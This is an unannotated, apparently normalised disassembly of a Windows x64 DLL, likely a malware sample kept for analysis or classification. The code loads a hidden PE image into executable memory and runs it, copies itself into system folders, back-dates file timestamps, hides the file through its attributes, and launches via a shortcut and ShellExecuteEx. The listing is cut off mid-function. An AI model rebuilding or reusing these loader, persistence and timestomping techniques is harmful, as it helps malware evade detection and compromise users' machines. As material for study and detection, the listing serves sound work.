sub_180001000
sub rsp 0x28
call [ GetFileAttributesA@IAT ]
mov r11d eax
cmp eax 0xffffffff
jne r-xdata
xor eax eax
and r11b 0x10
cmp r11b 0x10
setne al
add rsp 0x28
retn
xor eax eax
add rsp 0x28
retn
sub_180001090
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rbx rcx
lea rcx [ r--data ]
mov rdi rdx
call sub_180001030
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
xor ecx ecx
mov [ rsp + 0x50 ] 0x0
mov [ rw-data ] rax
call [ CoInitialize@IAT ]
mov rcx rbx
call sub_180001060
mov rcx rdi
mov rbx rax
call sub_180001060
mov rdi rax
test rax rax
je r-xdata
test rbx rbx
je r-xdata
xor edx edx
lea rax [ rsp + 0x50 ]
lea r9 [ r--data ]
lea r8d [ rdx + 0x1 ]
lea rcx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ CoCreateInstance@IAT ]
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x10 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x10 ]
mov rax [ rcx ]
mov edx 0x10840014
call [ rax + 0x28 ]
mov rcx [ rsp + 0x50 ]
lea r9 [ r--data ]
mov rax [ rcx ]
mov r8 rdi
mov rdx rbx
mov [ rsp + 0x20 ] 0x0
call [ rax + 0x80 ]
mov rcx [ rsp + 0x50 ]
mov rax [ rcx ]
call [ rax + 0xa8 ]
call [ CoUninitialize@IAT ]
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_1800011a0
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
push r13
push r14
sub rsp 0x20
mov rax [ r8 ]
mov r14 [ r8 + 0x8 ]
xor esi esi
mov rbp r8
movzx r8d [ rax + 0x14 ]
mov r12 rdx
mov r13 rcx
cmp si [ rax + 0x6 ]
jae r-xdata
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov [ rsp + 0x48 ] rdi
lea rdi [ r8 + rax + 0x28 ]
mov [ rsp + 0x40 ] rbx
mov ecx [ rdi - 0x4 ]
mov rdx rax
mov r9d 0x40
add rcx r14
mov r8d 0x1000
call [ VirtualAlloc@IAT ]
mov rbx rax
test rax rax
jne r-xdata
movsxd rax [ r12 + 0x38 ]
test eax eax
jle r-xdata
mov edx [ rdi + 0x4 ]
mov r8d [ rdi ]
mov rcx rbx
add rdx r13
call sub_1800031c0
mov [ rdi - 0x8 ] ebx
call [ GetLastError@IAT ]
mov rax [ rbp ]
inc esi
add rdi 0x28
movzx ecx [ rax + 0x6 ]
cmp esi ecx
jl r-xdata
mov ecx [ rdi - 0x4 ]
mov r9d 0x40
mov r8d 0x1000
mov rdx rax
add rcx r14
mov rbx rax
call [ VirtualAlloc@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
mov [ rdi - 0x8 ] eax
call sub_1800030c0
jmp r-xdata
mov eax [ rdi ]
test eax eax
jne r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
sub_1800012a0
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov r8 [ rcx ]
xor edi edi
mov rsi rcx
movzx eax [ r8 + 0x14 ]
cmp di [ r8 + 0x6 ]
jae r-xdata
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rbp
lea rbp [ rw-data ]
lea rbx [ rax + r8 + 0x3c ]
nop [ rax + rax ] eax
movsxd rcx eax
movsxd rax edx
lea rdx [ rax + rcx * 2 ]
lea rcx [ r10 + rdx * 2 ]
mov r10d [ rbp + rcx * 4 ]
bt r9d 0x1a
jae r-xdata
mov edx [ rbx - 0x14 ]
mov ecx [ rbx - 0x1c ]
mov r8d 0x4000
call [ VirtualFree@IAT ]
jmp r-xdata
mov ecx [ rbx - 0x14 ]
mov eax ecx
test ecx ecx
jne r-xdata
bts r10d 0x9
mov r8 [ rsi ]
inc edi
add rbx 0x28
movzx eax [ r8 + 0x6 ]
cmp edi eax
jl r-xdata
test eax eax
je r-xdata
test r9b 0x40
je r-xdata
mov r9d [ rbx ]
mov eax r9d
mov edx r9d
mov r10d r9d
shr eax 0x1d
shr edx 0x1e
shr r10d 0x1f
and eax 0x1
and edx 0x1
bt r9d 0x19
jae r-xdata
mov rbp [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
mov rdx rcx
mov ecx [ rbx - 0x1c ]
lea r9 [ rsp + 0x30 ]
mov r8d r10d
call [ VirtualProtect@IAT ]
test r9b r9b
jns r-xdata
mov eax [ r8 + 0x20 ]
jmp r-xdata
mov eax [ r8 + 0x24 ]
sub_1800013a0
mov [ rsp + 0x8 ] rbx
mov rax [ rcx ]
mov rbx [ rcx + 0x8 ]
mov r11 rdx
cmp [ rax + 0xb4 ] 0x0
jbe r-xdata
mov rbx [ rsp + 0x8 ]
retn
mov r8d [ rax + 0xb0 ]
add r8 rbx
mov eax [ r8 ]
test eax eax
je r-xdata
nop [ rax ] eax
mov eax [ r8 + 0x4 ]
add r8 rax
mov eax [ r8 ]
test eax eax
jne r-xdata
nop [ rax + rax ] ax
mov r10d eax
mov eax [ r8 + 0x4 ]
xor edx edx
sub eax 0x8
add r10 rbx
lea r9 [ r8 + 0x8 ]
test eax 0xfffffffe
jbe r-xdata
movsxd rax ecx
add [ rax + r10 ] r11
cmp eax 0xa
jne r-xdata
movzx eax [ r9 ]
mov ecx eax
shr eax 0xc
and ecx 0xfff
cmp eax 0x3
je r-xdata
mov eax [ r8 + 0x4 ]
inc edx
add r9 0x2
sub eax 0x8
shr eax 0x1
cmp edx eax
jb r-xdata
sub_180001440
push r12
push r13
sub rsp 0x28
mov rax [ rcx ]
mov r12 [ rcx + 0x8 ]
mov r13 rcx
cmp [ rax + 0x94 ] 0x0
jbe r-xdata
mov eax 0x1
add rsp 0x28
pop r13
pop r12
retn
mov [ rsp + 0x50 ] rsi
mov esi [ rax + 0x90 ]
mov edx 0x14
add rsi r12
mov rcx rsi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
mov rsi [ rsp + 0x50 ]
add rsp 0x28
pop r13
pop r12
retn
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x20 ] r14
mov r14 0x8000000000000000
mov eax 0x1
lea rcx [ r12 + rax ]
call [ LoadLibraryA@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ r13 + 0x18 ]
inc ecx
movsxd rdx ecx
mov rcx [ r13 + 0x10 ]
shl rdx 0x3
call sub_1800034f4
mov [ r13 + 0x10 ] rax
test rax rax
je r-xdata
mov rdi [ rsp + 0x58 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov r14 [ rsp + 0x20 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x28
pop r13
pop r12
retn
movsxd rcx [ r13 + 0x18 ]
mov [ rax + rcx * 8 ] rbp
inc [ r13 + 0x18 ]
mov eax [ rsi ]
test eax eax
je r-xdata
mov ebx [ rsi + 0x10 ]
add rbx r12
mov rdi rbx
mov edi [ rsi + 0x10 ]
lea rbx [ r12 + rax ]
add rdi r12
jmp r-xdata
add rsi 0x14
mov edx 0x14
mov rcx rsi
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
sub rdi rbx
nop [ rax + rax ] eax
mov rax [ rbx ]
test rax rax
je r-xdata
mov eax [ rsi + 0xc ]
test eax eax
je r-xdata
call [ GetProcAddress@IAT ]
mov [ rdi + rbx ] rax
test rax rax
je r-xdata
lea rdx [ rax + r12 + 0x2 ]
mov rax [ rbx + 0x8 ]
add rbx 0x8
test rax rax
jne r-xdata
mov rcx rbp
movzx edx ax
test r14 rax
jne r-xdata
sub_1800015c0
push r12
push r13
sub rsp 0x28
mov rax [ rcx ]
mov r12 [ rcx + 0x8 ]
mov r13 rdx
cmp [ rax + 0x8c ] 0x0
jne r-xdata
mov [ rsp + 0x40 ] rbx
mov ebx [ rax + 0x88 ]
add rbx r12
mov eax [ rbx + 0x18 ]
test eax eax
je r-xdata
xor eax eax
add rsp 0x28
pop r13
pop r12
retn
xor eax eax
mov rbx [ rsp + 0x40 ]
add rsp 0x28
pop r13
pop r12
retn
cmp [ rbx + 0x14 ] 0x0
je r-xdata
mov [ rsp + 0x48 ] rbp
mov ebp [ rbx + 0x24 ]
mov [ rsp + 0x50 ] rsi
mov esi [ rbx + 0x20 ]
mov [ rsp + 0x20 ] rdi
add rbp r12
add rsi r12
xor edi edi
test eax eax
je r-xdata
xor eax eax
nop [ rax + rax ] ax
movzx ecx [ rbp ]
cmp ecx 0xffffffff
je r-xdata
inc edi
add rsi 0x4
add rbp 0x2
cmp edi [ rbx + 0x18 ]
jb r-xdata
cmp ecx [ rbx + 0x14 ]
ja r-xdata
mov edx [ rsi ]
mov rcx r13
add rdx r12
call sub_180007f54
test eax eax
je r-xdata
mov eax [ rbx + 0x1c ]
lea ecx [ rax + rcx * 4 ]
mov eax [ rcx + r12 ]
add rax r12
jmp r-xdata
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rdi [ rsp + 0x20 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
pop r13
pop r12
retn
sub_1800016a0
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
xor esi esi
mov rbx rcx
cmp [ rcx + 0x1c ] esi
je r-xdata
cmp [ rbx + 0x10 ] rsi
je r-xdata
mov rax [ rbx ]
mov rcx [ rcx + 0x8 ]
xor r8d r8d
mov r9d [ rax + 0x28 ]
xor edx edx
add r9 rcx
call r9
mov [ rbx + 0x1c ] esi
mov rcx [ rbx + 0x8 ]
mov rsi [ rsp + 0x30 ]
test rcx rcx
je r-xdata
cmp [ rbx + 0x18 ] esi
jle r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
add rsp 0x20
pop rbx
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
mov rcx [ rbx + 0x10 ]
call sub_1800035c8
mov [ rsp + 0x38 ] rdi
mov rdi rsi
nop [ rax ] eax
inc esi
add rdi 0x8
cmp esi [ rbx + 0x18 ]
jl r-xdata
mov rcx [ rcx + rdi ]
call [ FreeLibrary@IAT ]
mov rcx [ rbx + 0x10 ]
cmp [ rcx + rdi ] 0xffffffffffffffff
je r-xdata
mov rdi [ rsp + 0x38 ]
sub_180001760
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
movsxd rbp [ rcx + 0x3c ]
mov r12 rcx
mov r9d 0x40
add rbp rcx
mov r8d 0x2000
mov edx [ rbp + 0x50 ]
mov rcx [ rbp + 0x30 ]
call [ VirtualAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rdi
call [ GetProcessHeap@IAT ]
xor edx edx
mov rcx rax
lea r8d [ rdx + 0x20 ]
call [ HeapAlloc@IAT ]
mov r8d 0x1000
mov rcx rsi
mov rdi rax
mov [ rax + 0x8 ] rsi
xor eax eax
mov [ rdi + 0x10 ] rax
mov [ rdi + 0x18 ] rax
mov edx [ rbp + 0x50 ]
lea r9d [ rax + 0x40 ]
call [ VirtualAlloc@IAT ]
mov edx [ rbp + 0x54 ]
mov r9d 0x40
mov r8d 0x1000
mov rcx rsi
call [ VirtualAlloc@IAT ]
mov r8d [ r12 + 0x3c ]
mov rdx r12
add r8d [ rbp + 0x54 ]
mov rcx rax
mov rbx rax
call sub_1800031c0
movsxd rcx [ r12 + 0x3c ]
mov eax esi
add rcx rbx
mov r8 rdi
mov rdx rbp
mov [ rdi ] rcx
mov [ rcx + 0x30 ] rax
mov rcx r12
call sub_1800011a0
mov rbx [ rsp + 0x30 ]
mov rdx rsi
sub rdx [ rbp + 0x30 ]
je r-xdata
mov edx [ rbp + 0x50 ]
lea r9d [ rax + 0x40 ]
xor ecx ecx
mov r8d 0x2000
call [ VirtualAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
mov rcx rdi
call sub_180001440
test eax eax
je r-xdata
mov rcx rdi
call sub_1800013a0
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov rcx rdi
call sub_1800016a0
xor eax eax
mov rcx rdi
call sub_1800012a0
mov r11 [ rdi ]
mov eax [ r11 + 0x28 ]
test eax eax
je r-xdata
mov rax rdi
jmp r-xdata
add rax rsi
je r-xdata
mov rdi [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
xor r8d r8d
mov rcx rsi
lea edx [ r8 + 0x1 ]
call rax
test eax eax
je r-xdata
mov [ rdi + 0x1c ] 0x1
sub_1800018e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x440
mov ebx ecx
lea rdi [ rw-data ]
lea rcx [ rsp + 0x21 ]
xor edx edx
mov r8d 0x1ff
mov [ rw-data ] 0x24000
mov [ rw-data ] rdi
call sub_1800030c0
xor r11d r11d
lea rcx [ rsp + 0x20 ]
lea rdx [ rw-data ]
mov r8d 0x12c
mov [ rsp + 0x220 ] r11d
call sub_1800031c0
mov rcx rdi
mov [ rsp + 0x220 ] ebx
call sub_180001760
test rax rax
je r-xdata
xor eax eax
mov rbx [ rsp + 0x450 ]
add rsp 0x440
pop rdi
retn
lea rdx [ r--data ]
mov rcx rax
call sub_1800015c0
mov rbx rax
test rax rax
je r-xdata
lea rcx [ rsp + 0x230 ]
lea rdx [ rsp + 0x20 ]
mov r8d 0x204
call sub_1800031c0
lea rcx [ rsp + 0x230 ]
call rbx
mov rbx [ rsp + 0x450 ]
add rsp 0x440
pop rdi
retn
sub_1800019b0
sub rsp 0x358
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x340 ] rax
lea rcx [ rsp + 0x21 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x20 ] 0x0
call sub_1800030c0
lea rcx [ rsp + 0x131 ]
xor edx edx
mov r8d 0x207
mov [ rsp + 0x130 ] 0x0
call sub_1800030c0
lea rcx [ rsp + 0x20 ]
mov edx 0x104
call [ GetSystemDirectoryA@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call [ lstrcatA@IAT ]
lea rcx [ rsp + 0x20 ]
call [ LoadLibraryA@IAT ]
mov r11 rax
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor eax eax
test r11 r11
setne al
mov rcx [ rsp + 0x340 ]
xor rcx rsp
call sub_180003090
add rsp 0x358
retn
lea r8 [ rsp + 0x20 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x130 ]
call [ wsprintfA@IAT ]
lea r8 [ r--data ]
lea rdx [ rsp + 0x130 ]
mov r9d 0x10
xor ecx ecx
call [ MessageBoxA@IAT ]
mov r11 [ rw-data ]
sub_180001aa0
push rbx
sub rsp 0x150
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x140 ] rax
mov rbx rcx
lea rcx [ r--data ]
call [ OutputDebugStringA@IAT ]
xor eax eax
lea rcx [ rsp + 0x31 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x20 ] 0x0
mov [ rsp + 0x21 ] rax
mov [ rsp + 0x29 ] eax
mov [ rsp + 0x2d ] ax
mov [ rsp + 0x2f ] al
mov [ rsp + 0x30 ] al
call sub_1800030c0
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
mov rdx rbx
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
call sub_1800019b0
test eax eax
jne r-xdata
mov rcx [ rsp + 0x140 ]
xor rcx rsp
call sub_180003090
add rsp 0x150
pop rbx
retn
mov rax rbx
shr rax 0x10
test ax ax
jne r-xdata
mov rcx [ rw-data ]
or ecx 0xffffffff
call [ ExitProcess@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
mov r8 rbx
call [ wsprintfA@IAT ]
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
mov r9d 0x10
xor ecx ecx
call [ MessageBoxA@IAT ]
mov ecx 0xfffffffe
call [ ExitProcess@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov r8 rbx
call [ wsprintfA@IAT ]
lea rbx [ rsp + 0x20 ]
sub_180001bb0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push rbp
lea rbp [ rsp - 0xc0 ]
sub rsp 0x1c0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xb0 ] rax
xor eax eax
mov rbx rcx
lea rcx [ rbp - 0x7f ]
xor edx edx
mov r8d 0x12b
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x70 ] rax
mov [ rbp - 0x80 ] al
call sub_1800030c0
lea rcx [ rbp - 0x80 ]
mov edx 0x12c
call [ GetSystemDirectoryA@IAT ]
xor esi esi
xor eax eax
or rcx 0xffffffffffffffff
mov [ rsp + 0x30 ] rsi
lea rdi [ rbp - 0x80 ]
[ rdi ]
mov rax [ r--data ]
lea r8d [ rsi + 0x1 ]
mov [ rdi - 0x1 ] rax
movzx eax [ r--data ]
lea rcx [ rbp - 0x80 ]
xor r9d r9d
mov edx 0x80000000
mov [ rsp + 0x28 ] 0x80
mov [ rdi + 0x7 ] al
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov eax 0x7d4
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x68 ] ax
mov eax 0x8
mov [ rsp + 0x70 ] 0x14
mov [ rsp + 0x6a ] ax
mov eax 0x11
mov [ rsp + 0x6e ] ax
call [ SystemTimeToFileTime@IAT ]
lea rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0x58 ]
call [ LocalFileTimeToFileTime@IAT ]
mov rdx [ rsp + 0x60 ]
mov [ rsp + 0x50 ] rdx
mov [ rsp + 0x40 ] rdx
mov [ rsp + 0x48 ] rdx
lea r9 [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x50 ]
mov rcx rax
call [ GetFileTime@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
jmp r-xdata
mov edx 0x7
mov rcx rbx
call [ SetFileAttributesA@IAT ]
mov rcx [ rbp + 0xb0 ]
xor rcx rsp
call sub_180003090
lea r11 [ rsp + 0x1c0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
lea r9 [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x50 ]
mov rcx rax
call [ SetFileTime@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
xor r9d r9d
mov [ rsp + 0x30 ] rsi
mov edx 0x40000000
lea r8d [ r9 + 0x2 ]
mov rcx rbx
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov rdi rax
test rax rax
je r-xdata
sub_180001d80
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
lea rbp [ rsp - 0x880 ]
sub rsp 0x980
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x870 ] rax
mov rbx rcx
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax 0x1
lea ecx [ rdx + 0x2 ]
mov [ rw-data ] edx
lea rcx [ rbp + 0xc1 ]
mov r8d 0x12b
xor edx edx
mov [ rbp + 0xc0 ] 0x0
call sub_1800030c0
lea rdx [ rbp + 0xc0 ]
mov r8d 0x12b
xor ecx ecx
call [ GetModuleFileNameA@IAT ]
lea rcx [ rbp + 0xc0 ]
call sub_1800081e4
lea rcx [ rbp + 0x741 ]
xor edx edx
mov r8d 0x12b
mov [ rbp + 0x740 ] 0x0
call sub_1800030c0
lea rdx [ rbp + 0x740 ]
mov r8d 0x12b
mov rcx rbx
call [ GetModuleFileNameA@IAT ]
lea rcx [ rbp + 0x611 ]
xor edx edx
mov r8d 0x12b
mov [ rbp + 0x610 ] 0x0
call sub_1800030c0
lea rcx [ rbp + 0x610 ]
mov edx 0x12c
call [ GetWindowsDirectoryA@IAT ]
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp + 0x610 ]
lea rdx [ r--data ]
[ rdi ]
mov rax [ r--data ]
lea rcx [ rbp + 0xc0 ]
mov [ rdi - 0x1 ] rax
movzx eax [ r--data ]
mov [ rdi + 0x7 ] ax
movzx eax [ r--data ]
mov [ rdi + 0x9 ] al
call sub_180003630
test rax rax
je r-xdata
lea rdx [ r--data ]
lea rcx [ rbp + 0xc0 ]
call sub_180003630
test rax rax
je r-xdata
lea rdx [ rbp + 0x610 ]
lea rcx [ rbp + 0x740 ]
call sub_180007f54
test eax eax
je r-xdata
mov rcx rbx
mov [ rw-data ] rbx
call [ DisableThreadLibraryCalls@IAT ]
mov ecx 0x1
jmp r-xdata
lea rcx [ rbp + 0x401 ]
xor edx edx
mov r8d 0x12b
mov [ rbp + 0x400 ] 0x0
call sub_1800030c0
lea rdx [ rbp + 0x400 ]
mov r8d 0x12b
mov rcx rbx
call [ GetModuleFileNameA@IAT ]
lea rcx [ rbp - 0x6f ]
xor edx edx
mov r8d 0x12b
mov [ rbp - 0x70 ] 0x0
call sub_1800030c0
lea rcx [ rbp - 0x70 ]
mov edx 0x12c
call [ GetWindowsDirectoryA@IAT ]
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x70 ]
[ rdi ]
mov rax [ r--data ]
lea rcx [ rbp - 0x70 ]
mov [ rdi - 0x1 ] rax
movzx eax [ r--data ]
mov [ rdi + 0x7 ] ax
movzx eax [ r--data ]
mov [ rdi + 0x9 ] al
call [ DeleteFileA@IAT ]
lea rcx [ rbp - 0x70 ]
call sub_180001000
test eax eax
je r-xdata
xor eax eax
lea rcx [ rbp + 0x1f2 ]
xor edx edx
mov r8d 0x206
mov [ rbp + 0x1f0 ] ax
call sub_1800030c0
lea rdx [ rbp + 0x1f0 ]
mov r8d 0x103
mov rcx rbx
call [ GetModuleFileNameW@IAT ]
lea rcx [ rbp + 0x438 ]
xor edx edx
movups xmm0 [ r--data ]
movups xmm1 [ r--data ]
mov r8d 0x1d0
movaps [ rbp + 0x400 ] xmm0
movaps [ rbp + 0x410 ] xmm1
movups xmm0 [ r--data ]
movsd xmm1 [ r--data ]
movaps [ rbp + 0x420 ] xmm0
movsd [ rbp + 0x430 ] xmm1
call sub_1800030c0
lea rdx [ rbp + 0x400 ]
lea rcx [ rbp + 0x1f0 ]
call sub_180001090
xor edx edx
lea rcx [ rsp + 0x20 ]
lea r8d [ rdx + 0x70 ]
call sub_1800030c0
lea rax [ r--data ]
lea rcx [ r--data ]
mov [ rsp + 0x38 ] rax
lea rax [ r--data ]
mov [ rsp + 0x20 ] 0x70
mov [ rsp + 0x24 ] 0x40
mov [ rsp + 0x50 ] 0x5
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x48 ] rax
call [ LoadLibraryW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ rsp + 0x20 ]
call rax
test eax eax
je r-xdata
call sub_1800018e0
lea rdx [ rbp - 0x70 ]
lea rcx [ rbp + 0x400 ]
mov r8d 0x1
call [ CopyFileA@IAT ]
lea rcx [ rbp - 0x70 ]
call sub_180001bb0
mov ecx 0xffffffbb
call [ ExitProcess@IAT ]
lea rcx [ rbp + 0x1f1 ]
xor edx edx
mov r8d 0x12b
mov [ rbp + 0x1f0 ] 0x0
call sub_1800030c0
lea rdx [ rbp - 0x70 ]
lea rcx [ rbp + 0x1f0 ]
mov r8d 0x12c
call sub_180002e90
lea rcx [ rbp + 0x1f0 ]
mov edx 0x5c
call sub_180003608
or rcx 0xffffffffffffffff
lea rdi [ rbp + 0x1f0 ]
mov [ rax + 0x1 ] 0x0
xor eax eax
lea rdx [ rbp + 0x1f0 ]
[ rdi ]
mov rax [ r--data ]
lea rcx [ rbp - 0x70 ]
mov [ rdi - 0x1 ] rax
mov eax [ r--data ]
mov [ rdi + 0x7 ] eax
movzx eax [ r--data ]
mov [ rdi + 0xb ] al
call sub_180003688
xor eax eax
jmp r-xdata
mov rcx [ rbp - 0x78 ]
test rcx rcx
je r-xdata
mov rcx [ rbp + 0x870 ]
xor rcx rsp
call sub_180003090
lea r11 [ rsp + 0x980 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rbp - 0x78 ]
call [ CloseHandle@IAT ]
sub_180002e90
mov r11 rcx
or r8 r8
je r-xdata
mov rax r11
retn
sub rcx rdx
test dl 0x7
je r-xdata
mov rax [ rdx ]
sub r8 0x8
jbe r-xdata
mov al [ rdx ]
test al al
mov [ rcx + rdx ] al
je r-xdata
add r8 0x8
je r-xdata
mov r9 0x7efefefefefefeff
add r9 rax
mov r10 rax
xor r10 0xffffffffffffffff
xor r10 r9
mov r9 0x8101010101010100
test r9 r10
je r-xdata
add rcx rdx
xor rdx rdx
cmp r8 0x10
jb r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
test al al
mov [ rcx + rdx ] al
je r-xdata
mov [ rcx + rdx ] rax
add rdx 0x8
sub r8 0x1
jb r-xdata
test cl 0x7
je r-xdata
test dl 0x7
jne r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
mov [ rcx ] dl
inc rcx
jmp r-xdata
sub r8 0x20
jb r-xdata
inc rcx
mov [ rcx ] dl
dec r8
jmp r-xdata
jmp r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
add r8 0x20
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
mov [ rcx + 0x18 ] rdx
add rcx 0x20
sub r8 0x20
jae r-xdata
inc rdx
dec r8
je r-xdata
add r8 0x8
mov [ rcx ] rdx
add rcx 0x8
jmp r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
sub r8 0x8
jb r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr eax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
jne r-xdata
sub_180002ff4
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_180003090
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_1800030c0
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_1800031c0
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
